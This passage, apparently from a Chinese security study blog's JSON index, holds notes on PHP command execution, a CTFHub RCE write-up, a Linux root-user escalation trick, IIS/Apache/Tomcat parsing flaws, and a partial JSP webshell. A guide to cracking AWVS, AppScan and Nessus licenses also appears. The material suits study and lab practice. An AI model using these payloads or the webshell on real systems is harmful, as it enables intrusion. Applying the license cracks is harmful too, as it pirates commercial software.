raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限\n# teehee 可以将标准输入复制到文件中\n# 如下命令可以在 &#x2F;etc&#x2F;passwd 文件中添加一行，实现添加一个拥有 root 权限的用户\n\necho &quot;test::0:0:::&#x2F;bin&#x2F;sh&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd\n&#x2F;&#x2F;test是用户名\n&#x2F;&#x2F;test::意思是test用户,密码为空\n&#x2F;&#x2F;test::0:0:::&#x2F;bin&#x2F;sh 意思是用户名为test,密码为空的超级用户\n&#x2F;&#x2F;-a 追加到..\n&#x2F;&#x2F; &#x2F;etc&#x2F;passwd 用户账号信息文件\n\n# 切换用户\nsu test\n\n\n6-3.git提权什么是git?\nGIT，全称是分布式版本控制系统，git通常在编程中会用到，并且git支持分布式部署，可以有效、高速的处理从很小到非常大的项目版本管理。分布式相比于集中式的最大区别在于开发者可以提交到本地，每个开发者通过克隆（git clone），在本地机器上拷贝一个完整的Git仓库。\n参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/qq_38612882/article/details/122772867\nhttps://www.cnblogs.com/HelloCTF/p/12803808.html\nhttps://blog.csdn.net/G_Fu_Q/article/details/116276096\n","slug":"渗透测试流程","date":"2022-12-20T12:56:06.407Z","categories_index":"学习笔记","tags_index":"渗透测试","author_index":"Abyssaler"},{"id":"266dd7a9ffe02e836b26a1bdfda91c39","title":"浅析命令执行漏洞","content":"漏洞描述命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有**system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )**等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大\n漏洞原理应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞\n常见危险函数php代码相关\neval()\nassert()\npreg_replace\ncall_user_func()\ncall_user_func_array()\ncreate_function\narray_map()\n\n系统命令执行相关\nsystem()\npassthru()\nexec()\npcntl_exec()\nshell_exec()\npopen()\nproc_open()\n&#96;(反单引号)\nob_start()\n\n特殊函数\nphpinfo()\n#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息\nsymlink()：\n#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容\ngetenv\n#获取一个环境变量的值\nputenv($a)\n#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态\n\n\n\n危险函数:systemsystem — 执行外部程序，并且显示输出\n该函数会把执行结果输出并把输出结果的最后一行作为字符串返回如果执行失败则返回false这个也最为常用\n语法\nsystem(string $command, int &amp;$result_code &#x3D; null): string|false\n\n同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。\n如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。\n如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。\n\n参数\ncommand\n要执行的命令。\n\nresult_code\n如果提供 result_code 参数，则外部命令执行后的返回状态将会被设置到此变量中\n\n返回值\n成功则返回命令输出的最后一行，失败则返回 false\n\n例子\n&lt;?php\necho &#39;&lt;pre&gt;&#39;;\n\n&#x2F;&#x2F; 输出 shell 命令 &quot;ls&quot; 的返回结果\n&#x2F;&#x2F; 并且将输出的最后一样内容返回到 $last_line。\n&#x2F;&#x2F; 将命令的返回值保存到 $retval。\n$last_line &#x3D; system(&#39;ls&#39;, $retval);\n\n&#x2F;&#x2F; 打印更多信息\necho &#39;\n&lt;&#x2F;pre&gt;\n&lt;hr &#x2F;&gt;Last line of the output: &#39; . $last_line . &#39;\n&lt;hr &#x2F;&gt;Return value: &#39; . $retval;\n?&gt;\n\nexecexec — 执行一个外部程序\n不输出结果返回执行结果的最后一行可以使用output进行输出\n语法\nexec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code &#x3D; null): string|false\n&#x2F;&#x2F;exec() 执行 command 参数所指定的命令。    \n\n参数\ncommand\n要执行的命令。\n\noutput\n如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。\n\nresult_code\n如果同时提供 output 和 result_code 参数，命令执行后的返回状态会被写入到此变量。\n\n返回值\n命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。\n\n失败时返回 false。\n\n如果想要获取命令的输出内容， 请确保使用 output 参数。\n\n例子\n&lt;?php\n&#x2F;&#x2F; 输出运行中的 php&#x2F;httpd 进程的创建者用户名\n&#x2F;&#x2F; （在可以执行 &quot;whoami&quot; 命令的系统上）\n$output&#x3D;null;\n$retval&#x3D;null;\nexec(&#39;whoami&#39;, $output, $retval);\necho &quot;Returned with status $retval and output:\\n&quot;;\nprint_r($output);\n?&gt;\n    \n输出:\nReturned with status 0 and output:\nArray\n(\n    [0] &#x3D;&gt; cmb\n)\n\npassthrupassthru — 执行外部程序并且显示原始输出\n此函数只调用命令并把运行结果原样地直接输出没有返回值。\n语法\npassthru(string $command, int &amp;$result_code &#x3D; null): ?bool\n\n同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。\n参数\ncommand\n要执行的命令。\n\nresult_code\n如果提供 result_code 参数， Unix 命令的返回状态会被记录到此参数\n\n返回值\n成功时返回 null， 或者在失败时返回 false。\n\n例子\n&lt;?php\nhighlight_file(__FILE__);\npassthru(&#39;ls&#39;);\n?&gt;\n\nshell_execshell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回\n不输出结果，返回执行结果使用反引号(&#96;&#96;)时调用的就是此函数\n语法\nshell_exec(string $command): string|false|null\n\n参数\ncommand\n要执行的命令。\n\n返回值\nstring 包含已执行命令的输出，如果无法建立管道，则为 false，如果发生错误或者命令不产生输出则为 null\n\n注意:当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 null。使用本函数无法检测执行是否成功。当需要访问程序退出代码时，应使用 exec()。\n\n例子\n&lt;?php\n$output &#x3D; shell_exec(&#39;ls -lart&#39;);\necho &quot;&lt;pre&gt;$output&lt;&#x2F;pre&gt;&quot;;\n?&gt;\n\n\n\n命令连接符windows系统“|”：直接执行后面的语句\n例如：ping www.baidu.com|whoami\n\n\n“||”：如果前面执行的语句执行出错，则执行后面的语句\n例如：png www.baidu.com||whoami\n\n\n“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假\n例如：png www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami\n\n\n“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句\n例如：ping www.baidu.com&amp;&amp;whoami png www.baidu.com&amp;&amp;whoami\n\n\nLinux系统“；”执行完前面的命令执行后面的\n\n\n“|”：显示后面语句的执行结果\n\n\n“||”：当前面的语句执行出错时，执行后面的语句\n\n\n“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假\n\n\n“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句\n\n\n常用命令Windowsnetstat -ano：查看所有进程（1）netstat –ano|findstr [指定端口号]：该命令查看哪个程序或进程占用了端口\ntasklist：列出所有任务及进程号（1）tasklist|findstr [进程名称]：找到进程名称对应的详细信息，例如PID\ntaskkill：杀进程（1）强制结束进程，按名称：taskkill &#x2F;f &#x2F;im notepad.exe（关闭记事本）（2）强制结束进程，按 PID：taskkill &#x2F;f &#x2F;pid 1234（关闭 PID 为 1234 的进程）\n--help或/?：查看帮助信息\ncd：切换目录\nD:：跳转到其他硬盘\nping：测试IP\nipconfig：查看网络详情，类似于linux的ifconfig\ndir：显示目录中的文件内容，类似于linux的ls\ntype：查看文件，类似于linux的cat、less、more；用法：type 文件名\nmd：创建文件夹，类似于linux的mkdir；用法：md 目录名\ntree：查看目录结构\ntracert：路由跟踪，确定IP数据包访问目标时所选择的路径；用法：tracert 域名或IP\ncopy：复制文本文件；用法：copy 文件1 文件2注：参数&#x2F;b指定以二进制格式复制、合并文件，用于图像类&#x2F;声音类文件参数&#x2F;a指定以ASCII格式复制、合并文件，用于txt等文档类文件图片马制作：copy x.jpg&#x2F;b + x.php&#x2F;a xx.jpg\nnet start 服务名；net stop 服务名\ncls：清空cmd命令行，类似于linux的clear\nctrl+C：结束或退出cmd正在执行的脚本\nfind：查找find &#x2F;c “所要搜索的文件所包含的字符串” 文件的绝对路径\nfor：对一个或一组文件，字符串或命令结果中的每一个对象执行特定命令（1）找出C盘下的所有文件，并将所有文件名都输出出来for /r C: %i in (*) do @echo %i（2）找出C盘下所有后缀是.txt的文件，并将其输出for /r C: %i in (*.txt) do @echo %i（3）找出C盘下所有后缀是.txt和.jpg的文件，并将其输出for /r C: %i in (*.txt,*.jpg) do @echo %i\nLinuxcd：切换当前工作目录；用法：cd后面加目录（1）cd &#x2F;root：进入&#x2F;root 目录（2）cd …&#x2F;：返回上一级目录（3）cd .&#x2F;：进入当前目录\nls：显示指定工作目录下的内容；用法：ls 文件或目录（1）ls：.&#x2F; 查看当前目录所有的文件和目录（2）ls -l：以长格式显示目录下的内容列表（3）ls -a：查看所有的文件，包括隐藏文件，以.开头的文件\ncp：拷贝文件；用法：cp 要复制的文件 目标路径（1）cp xx.txt &#x2F;home&#x2F;backup.txt ，拷贝文件至&#x2F;home目录下并且重命名为bak.txt（2） cp xx –r &#x2F;home：拷贝xx目录到&#x2F;home目录下\ncat：查看文件内容；用法：cat 文件绝对路径（1）cat test.txt：查看test.txt文件内容\necho：回显；用法：输入什么就打印什么（1）echo hello\n&gt;：表示追加覆盖；常见用法echo world &gt; test.txt\n&gt;&gt;：表示追加；常见用法echo world &gt;&gt; test.txt\nfind：查找指定文件；用法：find 目录 -name 文件（1）find &#x2F;home -name “*.txt” ：查找&#x2F;home目录下，所有以.txt 结尾的文件或者目录。\ngroupadd：创建组；用法：groupadd 组名；注：在&#x2F;etc&#x2F;group中查看组名；注：将某用户加入root用户组：usermod –g root 用户名\ngroupdel：删除组；用法：groupdel 组名\ngrep：用于查找文件里符合条件的字符串；用法：grep 参数 目标-r：指定要查找目标的是目录而非文件时使用-n：显示具体行数–include：指定后缀文件（1）grep -rn “eval“ target：搜索target目标(目录&#x2F;文件)中是否含有eval的文件，并且确定在所含有的文件中是第几行（2）grep -rn –include&#x3D;‘*.php’ ‘eval(’ target：搜索target目标(目录&#x2F;文件)中是否含有eval的文件(注：这里是指定只搜索.php后缀的文件)，并且确定在所含有的文件中是第几行\nhead：默认查看文件前10行内容；用法：head 文件名；如果查看前20行，用法：head -20 文件名\ntail：默认查看文件后10行内容；用法：tail 文件名，如果查看后20行，用法：tail -20 文件名\nmore或less：分页查看文件内容；用法：more 文件名或less 文件名注：cat 和 more 同时使用例如： cat test.txt |more 分页显示 text 内容，|符号是管道符，用于把|前的输出作为后面命令的输入\nuseradd：创建用户；用法：useradd 用户名，注：在&#x2F;etc&#x2F;passwd中可查看（1）将用户添加到指定组中： useradd -g 组名 用户\nuserdel：删除用户；用法：userdel 用户名\npasswd： 设置密码；passwd 用户名，不加用户名默认修改当前用户\nvi：修改文件（命令行模式、文本输入模式、末行模式），vi或vim打开一个文件，首先是命令行模式，然后按 i 进入文本输入模式，可以在文件里写入字符等信息。写完后，按 esc 进入命令模式，然后输入:进入末行模式，例如输入 :wq 表示保存退出。如果想直接退出，不保存，可以执行 :q ， 如果无法退出可以使用 q! 强制退出。\nid：显示用户的ID，以及所属群组的ID\nifconfig：显示网络详情\nnetstat：显示网络状态netstat –anplt：查看所有tcp端口netstat –anplu：查看所有udp端口\nkill：删除执行中的程序或工作kill -9：强制执行\nping：检测主机；用法：ping ip\nps：显示当前进程的状态，类似于 windows 的任务管理器\nreboot：重启；用法：reboot -f（强制重启）\nsu：切换用户；用法：su 用户名\nsudo：使用root用户执行命令；用法：sudo 命令\nuname：显示系统信息；用法：uname –a（显示系统详细信息）\nwhoami：显示自身用户名称\n--help：命令使用详情查询；用法：命令 –help\nclear：清空命令行\npwd：显示当前所在的目录\nmkdir：创建目录；用法：mkdir 目录名\nrmdir：删除空目录，非空不可删除；用法：rmdir 空目录名称\nrm：删除文件或者目录，用法：rm –rf 文件名或目录 (-r 表示递归，-f 表示强制)\ntouch：创建文件；用法：touch 文件名，如果文件存在，则修改当前文件时间，文件内容不变\nmv：重命名或者移动文件&#x2F;目录；用法： mv 原文件名 新文件名 或 mv 原文件位置 新文件位置\nchmod：修改文件或目录的权限chmod u+x 目录&#x2F;文件：给该目录&#x2F;文件所有者赋予执行权限chmod ug-x 目录&#x2F;文件：给该目录&#x2F;文件所有者和组用户减去执行权限chmod 777 目录&#x2F;文件：给该目录&#x2F;文件所有者、组用户、其他用户赋予所有权限chmod 764 目录&#x2F;文件：给该目录&#x2F;文件所有者赋予全部权限，组用户赋予读写权限，其他用户赋予读权限\nscp：复制文件和目录（1）从本地复制到远程scp local_file remote_username@remote_ip:remote_folder或者scp local_file remote_username@remote_ip:remote_file（2）从远程复制到本地scp remote_username@remote_ip:remote_folder local_file或者scp remote_username@remote_ip:remote_file local_file\n部分文章内容和图片应用自:\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/weixin_44604541/article/details/109558036\nhttps://blog.csdn.net/LYJ20010728/article/details/117349106\nhttps://blog.csdn.net/qq_41617034/article/details/115583211感谢这几位师傅了\n","slug":"命令执行漏洞","date":"2022-11-30T15:59:15.004Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"},{"id":"47fc5eb1db81ba54d8cb43c79f27163b","title":"ctfhub之RCE","content":"eval执行题目:\n所需知识:eval():把字符串 code 作为PHP代码执行。函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、未经完整验证过的数据 。\n\n解题过程:这题根据源码其实有两种解题思路,下面挨个讲解\n解法一直接在url地址后面输入?cmd=system(&quot;ls /&quot;);切记输入；\n这里的意思就是查看根目录\n\n可以看到个flag_30217这个文件\n再用?cmd=system(&quot;cat /flag_30217&quot;);就能查看文件内容了\n\n解法二这种解法更为简单粗暴\n分析源码,这其实就是php的一句话木马,所以这里我们直接用蚁剑连接就好了,密码为cmd\n\n剩下的过程就不必我多说了\n文件包含题目：\n解题思路if (isset($_GET[&#39;file&#39;])) &#123;\n    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;\n        include $_GET[&quot;file&quot;];\n\n重点是这段代码\n这里有一个strpos(string,find,start)函数\n这里意思在string字符串中找find的位置,start是查找的开始位置\n那么这句代码的意思就是如果file中没有flag字符串就执行下面的include $_GET[&quot;file&quot;]\n否则就输出Hacker。\nstrpos()函数strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。\n语法\nstrpos(string,find,start)\n\n参数\nstring\t必需。规定被搜索的字符串。\n\nfind\t必需。规定要查找的字符。\n\nstart\t可选。规定开始搜索的位置。\n\n返回值\n返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释： 字符串位置从 0 开始，不是从 1 开始。\n\n\n\n再看一下shell\n&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;\n\n是将ctfhub传的参数用php执行\ninclude()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。\n输入一个文件的名字，可以直接将文件include到php文件中,这里显然是让我们把shell引入\n在hackbar中这样输入\nctfhub=system(&#39;ls /&#39;);\n\n可以看到flag\n再输入ctfhub=system(&#39;cat /flag&#39;);\n\n找到flag\nphp:&#x2F;&#x2F;input题目:\n解题思路这道题要做的事情就是，找到flag文件存储的存储的位置，然后，读取。这样的话，应该是需要命令执行的漏洞。此时php:&#x2F;&#x2F;input有一个知识点：\nphp:&#x2F;&#x2F;input\n所以我们需要使用php://input来构造发送的指令\n查看phpinfo，找到条件\n\n说明可以用php:&#x2F;&#x2F;input\n使用burp suite抓包\n方法：POST\n目标：&#x2F;?file&#x3D;php:&#x2F;&#x2F;input\nBody：&lt;?php system(&quot;ls &#x2F;&quot;); ?&gt;\n\n\n这里我写错了,应该是php://input\n\n接下来就是查看了&lt;?php system(&#39;cat /flag_10874&#39;); ?&gt;\n\n读取源代码题目:\n解题思路:试了试 php:&#x2F;&#x2F;input 发现用不了,应该是条件不允许了\n这里引入另一个php伪协议:php://filter\nphp:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。\n\nPHP.ini：\nphp:&#x2F;&#x2F;filter在双off的情况下也可以正常使用；\nallow_url_fopen ：off&#x2F;on\nallow_url_include：off&#x2F;on\n\n\n告诉flag的位置在&#x2F;flag里，接下来就直接用php:&#x2F;&#x2F;filter提取就可以了。\n?file=php://filter/resource=/flag\n\n远程包含题目:\n解题思路:思路和前面几题基本一致\n在PHP的配置文件php.ini里将allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。\n直接用php:&#x2F;&#x2F;input进行命令执行\n\n查看flag\n\n命令注入题目：\n\n\n所需知识：如果你是大佬这段可以不看,我写出来主要是自己代码知识薄弱,方便我理解代码的意思\nexec（）函数：PHP中提供了几个调用linux命令的函数，exec、system、passthru；\n其中exec()函数用来执行一个外部程序。\nphp中的exec()函数的用法：exec()函数用于执行一个外部程序，语法为：【exec(string $command[,array &amp;$output[,int &amp;$return_var ]]);】。\n\n开启exec()函数：\nexec()函数是被禁用的，要使用这个函数必须先开启。首先是 要关掉 安全模式 safe_mode &#x3D; off。然后在看看 禁用函数列表\ndisable_ functions &#x3D; proc_ open,popen,exec,system,shell_ exec,passthru\n\n这里要把 exec 去掉，重启 apache 就OK了。\nexec()函数基本用法：\nexec(string $command [,array &amp;$output[, int &amp;$return_var]]);\n\n$command：表示要执行的命令。\n$output: 如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如  \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入  exec() 函数之前 对数组使用 unset() 函数进行重置。\n$return_var:如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。\n一般来说，我们只要写第一个参数，也就是$command。\n例子:\n&lt;?php\n$command &#x3D; &quot;ls &#x2F;tmp&#x2F;test&quot;; &#x2F;&#x2F;ls是linux下的查目录，文件的命令\nexec($command,$array); &#x2F;&#x2F;执行命令\nprint_r($array);\n?&gt;\n\n返回结果:\n[root@krlcgcms01 shell]# php .&#x2F;exec.php\nArray\n(\n[0] &#x3D;&gt; 1001.log\n[1] &#x3D;&gt; 10.log\n[2] &#x3D;&gt; 10.tar.gz\n[3] &#x3D;&gt; aaa.tar.gz\n[4] &#x3D;&gt; mytest\n[5] &#x3D;&gt; test1101\n[6] &#x3D;&gt; test1102\n[7] &#x3D;&gt; weblog_2010_09\n)\n\nPHP print_r() 函数:print_r() 函数用于打印变量，以更容易理解的形式展示。\n语法:\nbool print_r ( mixed $expression [, bool $return ] )\n\n参数说明：\n\n$expression: 要打印的变量，如果给出的是 string、integer 或 float 类型变量，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。\n$return: 可选，如果为 true 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果。\n\n返回值:\n$return 如果设为 true 才有返回值，为一个易于理解的字符串信息。\n解题过程：直接尝试ping百度\n\n构造payload\n127.0.0.1|ls\n\n\n可以看到疑似flag的文件\n127.0.0.1|cat 278433166717673.php\n\n没有任何结果\n\n再次构造:\n127.0.0.1|cat 278433166717673.php|base64\n\n\n再把这串代码拿去base64解码\n\n得到flag\n也可以直接用cat查看\n127.0.0.1|cat 278433166717673.php\n\n","slug":"ctfhub之RCE","date":"2022-11-30T15:23:08.850Z","categories_index":"CTF","tags_index":"writeup","author_index":"Abyssaler"},{"id":"3969cae396587846c4e6dba7e64fd9e1","title":"漏洞扫描工具安装及配置","content":"\n\n\n\n\n\n\n\n\n工具下载地址\n链接：https://pan.baidu.com/s/1Ysn-u1ae6Z-p4PD2lDTKrg?pwd=x3ji提取码：x3ji \nAWVS先将压缩包解压\n\n点击进行安装\n\n一直下一步就行了，让你输邮箱就随便输一个，但是要记住\n\n记住端口号\n\n安装\n\n安装途中会弹窗，询问你是否安装证书，点确认\n\n安装完成\n\n接下来打开另一个工具（仅供学习交流，请支持正版！）\n\n点击确定\n\n会自动打开浏览器，这是你访问本地3443端口\n\n输入安装时的账号和密码登录，发现没有激活成功\n\n别急，用补丁包\n\nWIN+R输入services.msc打开服务\n\n找到并停止这两个服务\n\n把补丁里的license_info.json和wa_data.dat替换掉Acunetix Data的安装目录下的 shared\\license\n\n将补丁包中的wvsc.exe 替换掉Acunetix\\14.3.210615184目录\n\n重新启动服务\n\n使用浏览器访问本机的3343端口，进行登录,激活成功\n\nAppScan解压文件\n\n直接点击安装包安装\n\n选择好路径\n\n安装完成\n\n将这两个文件替换掉安装目录中的文件\n\n\n双击桌面图标运行appscan\n\n汉化\n\n\n然后重启就行了\nNessus解压文件\n\n双击Nessus.msi运行\n\n自己选择安装路径\n\n等待安装,安装完成\n\n当点击finish后，会自动使用浏览器访问本地的8838端口，点击connect via SSL\n\n选择managed scanner，继续\n\n选择Tenable.sc，继续\n\n创建账号密码，继续\n\n安装完成会自动跳转\n\n注册\n以管理员的身份打开powershell\n\n先停止tenable服务\nnet stop &quot;tenable nessus&quot;\n\n\n\n\n切换到当前目录\n\n找到你之前安装nessus的目录\n\n运行代码更新插件\n&amp; &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessuscli.exe&#39; update .\\all-2.0.tar.gz\n\n\n更新成功\n\n将lougin_feed_info.inc复制到下面这个文件夹\n\ncopy .\\plugin_feed_info.inc &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessus\\&#39;\n\n\n\n\n找到这个文件夹\n\n执行以下代码\nattrib +s +r +h &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessus\\plugins\\*.*&#39;\n\n\n然后执行\nattrib +s +r +h &#39;E:\\tools\\Vulnerability scanning\\Nessus\\nessus\\plugin_feed_info.inc&#39;\n\n\n重启nessus\nnet start &quot;tenable nessus&quot;\n\n\n再次访问 https://localhost:8834/#/\n\n等待安装,登陆成功\n\n\n关闭部分选项\nauto_update no 关闭自动更新\nsend_telemetry no\nautomatically update Nessus\n\n\n\n修改之后重新访问https://localhost:8834/#/ 即可\n\n","slug":"漏洞扫描工具安装","date":"2022-11-25T04:30:44.427Z","categories_index":"环境配置","tags_index":"工具","author_index":"Abyssaler"},{"id":"9ca6f9d849950348e5ffe49b9724c767","title":"中间件漏洞","content":"IIS简介IIS（Internet Information Services），互联网信息服务，由微软公司提供的可扩展web服务器，支 持HTTP、HTTP&#x2F;2、HTTPS等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP和后 续版本一起发布，IIS目前只支持Windows系统，不适用于其他操作系统\nIIS6.0解析漏洞第一种:文件解析IIS6.0&#x3D;&#x3D;&gt;1.asp;.jpg&#x3D;&#x3D;&gt;00截断的变形\n检测时会以最后一个.去判断，为jpg\n中间件解析时会以.asp解析\n\n原理：服务器默认不解析;号后面的内容，因此1.asp;.jpg便被解析成asp文件了\n\n修复方案：用正则写自定义WAF，阻止1.asp;.jpg类型的文件名\n\n\n\n第二种:目录解析a.asp&#x2F;123.jpg&#x3D;&#x3D;&gt;会不会是个目录？\n当中间件IIS6.0遇到a.asp&#x2F; 时 会把a.asp&#x2F; 下的所有内容当作asp文件执行\n\n原理：服务器默认会把.asp，.asa目录下的文件都解析成asp文件\nasp站点 IIS6.0：一般来说aspx的站点会兼容asp\nIIS6.0默认的可执行文件除了asp还包含asa、cer、cdx\n\n修复方案：用正则写自定义WAF，阻止a.asp&#x2F;123.jpg该类型的链接\n\n\n\nIIS7.0&#x2F;IIS7.5 解析漏洞\n\n\n\n\n\n\n\n\nwww.xx.com/phpinfo.jpg/1.php\n当中间件访问1.php 会认为它是一个PHP文件，当1.php不存在时，会自动跳转至上一级phpinfo.jpg，\n会把phpinfo.jpg误当作php文件去执行\n\n意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“&#x2F;xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。\n\n1.jpg&#x2F;1.php\n\n修复方案：用正则写自定义WAF，阻止phpinfo.jpg&#x2F;1.php该类型的链接\n\n\n\n\n\nApache简介Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多 数计算机操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它 快速、可靠并且可通过简单的API扩展，将Perl&#x2F;Python等解释器编译到服务器中。\n配置文件漏洞Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件名，解析就再往左判断。 \n比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别文件名解析，apache就会把 oldboy.php.owf.rar解析成oldboy.php。\n漏洞形式:\n\n\n\n\n\n\n\n\n\nwww.xxxx.xxx.com/test.php.php123\n配置文件修改1、如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。 \n2、如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。\n修复方案apache配置文件，禁止.php.这样的文件执行\n在配置文件中加入\n&lt;Files ~ “.(php.|php3.)”&gt;\n\tOrder Allow,Deny\n\tDeny from all\n&lt;&#x2F;Files&gt;\n\n\n\nTomcat常见高危漏洞Tomcat后台弱口令上传war包\nTomcat的PUT的上传漏洞(CVE-2017-12615)\nTomcat反序列化漏洞(CVE-2016-8735)\nTomcat之JMX服务弱口令漏洞\nTomcat 样例目录session操控漏洞\nTomcat本地提权漏洞(CVE-2016-1240)\nTomcat win版默认空口令漏洞(CVE-2009-3548)\n\n\n\n简介TomcatTomcat是一个实现了JAVA EE标准的最小的WEB服务器，是Apache 软件基金会的Jakarta 项目 中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性 能稳定，而且开源免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流 行的Web 应用服务器。 \n在B&#x2F;S架构中，浏览器发出的http请求经过Tomcat中间件，转发到最终的目的服务器上，响应消息再通 过Tomcat返回给浏览器。\n远程代码执行漏洞(PUT请求上传漏洞)漏洞编号:CVE-2017-12615\n漏洞描述当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者通过构造的攻击请求向服 务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重\n漏洞原理利用条件：Windows+Tomcat 7.0.x+配置文件readonly=false\n&lt;init-param&gt;\n&lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;\n&lt;param-value&gt;false&lt;&#x2F;param-value&gt;\n&lt;&#x2F;init-param&gt;\n\nTomcat 的 Servlet 是在 conf&#x2F;web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候， 是通过 JspServlet 处理请求的：而其他的静态文件是通过 DefaultServlet 处理的：可以得知，“1.jsp空 格”（末尾有一个和空格）并不能匹配到 JspServlet，而是会交由 DefaultServlet 去处理。 \n当处理 PUT 请求时：会调用 resources.bind：dirContext 为 FileDirContext：调用 rebind 创建文 件：又由于 Windows 不允许“ ”作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。\n影响版本Apache Tomcat 7.0.0 - 7.0.81\n需要开启PUT请求方法\n修复方案readonly参数为true\n升级版本\n漏洞复现1.通过vulhub拉取环境\n\n2.通过burp抓取访问目录根目录的请求包，并发送到repeater模块\n\n3.将GET请求方式修改为OPTIONOS\ntips：OPTIONS请求方式请求服务器返回所支持的所有HTTP请求方法\n\n不允许此请求，再次修改\n\n4.OPTIONOS请求改为PUT，修改名字,并在下面添加jsp的shell\nshell: \n密码为passwd\n&lt;%!\n    class U extends ClassLoader &#123;\n        U(ClassLoader c) &#123;\n            super(c);\n        &#125;\n        public Class g(byte[] b) &#123;\n            return super.defineClass(b, 0, b.length);\n        &#125;\n    &#125;\n \n    public byte[] base64Decode(String str) throws Exception &#123;\n        try &#123;\n            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);\n            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);\n        &#125; catch (Exception e) &#123;\n            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);\n            Object decoder &#x3D; 